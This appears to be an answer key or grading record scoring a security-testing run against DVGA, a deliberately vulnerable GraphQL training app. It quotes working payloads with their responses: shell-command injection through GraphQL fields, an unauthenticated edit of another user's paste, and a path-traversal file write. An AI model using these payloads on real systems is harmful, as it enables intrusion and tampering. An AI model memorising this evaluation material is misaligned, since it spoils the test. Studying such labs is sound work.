truth.title: OS Command Injection #1 (importPaste path fragment)
truth.evidence: `{"query":"mutation{importPaste(host:\"127.0.0.1;id;#\",port:9,path:\"/\",scheme:\"http\"){result}}"}` 'returned the `result` field containing `uid=1000(dvga) gid=1000(dvga) groups=1000(dvga)` as well (the shell concatenated the host, a semicolon-separated `id`, and a `#` to comment out the rest of the curl/wget command line).'
truth.note: Judgement call. The entry's title names the `path` fragment, the report injected through `host` - same importPaste mutation, same shell-concatenation flaw, so this is the right endpoint, not the 'right class on the wrong endpoint' case the rubric makes fp. Marked down a notch in confidence because the response is narrated rather than quoted raw, though the command output is quoted.

truth.title: OS Command Injection #2 (systemDiagnostics/systemDebug)
truth.evidence:
Request `{"query":"{ systemDebug(arg:"x; id") }"}` -> Response `{"data":{"systemDebug":"    PID TTY      STAT   TIME COMMAND
      1 ?        Ss     0:00 python app.py
     18 ?        S      0:00 /bin/sh -c ps x; id
     19 ?        R      0:00 ps x
uid=1000(dvga) gid=1000(dvga) groups=1000(dvga)
"}}`.
truth.note: systemDebug half of the entry is conclusive; systemDiagnostics was not exercised (no credentials were recovered), but the entry is one row and one surface proves it.

truth.title: Stored Cross Site Scripting
truth.evidence:
Stored source: `mutation{createPaste(title:"",...)}` -> `{"data":{"createPaste":{"paste":{"id":"18","title":""}}}}`, 'echoed back byte-for-byte with no entity encoding, and `pastes(public:true)` - the exact query `/public_pastes` issues - returns it the same way'. Sink, quoted from the page the arm fetched: `$("#public_gallery").append(`
... ${title} ... 
${content}
...`)` with '`title`, `content`, `owner`, `ipAddr`, and `userAgent` are all interpolated unescaped.'
truth.note: Judgement call, and the single biggest difference between this report and the others on XSS. No browser execution was demonstrated, but both ends of the chain are evidenced: the stored payload returned verbatim by the exact query the public page issues, and the unescaped jQuery `.append()` sink quoted from that page's own inline script. I count that as proving the entry; the two reports that showed only the storage half are rated missed.

truth.title: HTML Injection
truth.note: Hardest call in this report. The same evidence that proves dvga-15 (unescaped markup reaching an unescaped DOM sink) also implies HTML injection, but the arm reports one finding and no rendered page response containing injected HTML is shown. Credited the sink evidence once, to the stored-XSS entry, rather than twice; taking the stricter option on the second entry and applying the same bar to all four reports, none of which demonstrates HTML rendering.

truth.title: GraphQL Interface Protection Bypass (pastes(public:false) unauthenticated)
truth.evidence: Request (no Authorization header) `{"query":"mutation{editPaste(id:1,title:\"[ARM]\"){paste{id title}}}"}` -> `{"data":{"editPaste":{"paste":{"id":"1","title":"[ARM]"}}}}`, described as 'editing a paste owned by a different account, with no auth header at all'.
truth.note: Judgement call. The entry's parenthetical names `pastes(public:false)`, which this report never issues; what it does prove with a request/response is unauthenticated read and write of another account's paste, which is the substance of the authorization-bypass entry. Counted found on the substance rather than the parenthetical.

truth.title: Arbitrary File Write / Path Traversal
truth.evidence: `mutation{uploadPaste(filename:"../static/[ARM].txt",content:"[ARM]"){result}}` -> `{"data":{"uploadPaste":{"result":"[ARM]"}}}`, verified by `GET /static/[ARM].txt` -> `HTTP/1.1 200 OK ... Content-Length: 13` with the written body returned.
truth.note: Traversal out of the upload directory and the write both verified by reading the file back through the app.
